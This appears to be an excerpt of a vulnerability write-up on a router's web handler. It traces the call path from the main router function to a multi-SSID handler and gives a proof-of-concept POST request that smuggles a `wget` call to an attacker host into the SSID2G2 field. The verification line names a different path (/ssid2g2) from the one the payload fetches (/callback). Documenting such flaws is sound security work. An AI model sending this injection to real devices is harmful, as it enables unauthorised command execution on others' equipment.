...
ftext (main router)
  → sub_401D68 (multi_ssid handler)
    → sub_405EA8 (URL decode, reads SSID2G2 POST parameter)
...
1. User sends POST request with `page=multi_ssid&wifi_multi_ssid=1&SSID2G2=$(wget http://attacker:6666/callback)&AuthMethod2=OPEN&EncrypType2=NONE`
2. `sub_401D68` reads `SSID2G2` → `$(wget http://attacker:6666/callback)`
...
**Verification:** Monitor receives `GET /ssid2g2` from device IP, confirming command execution.
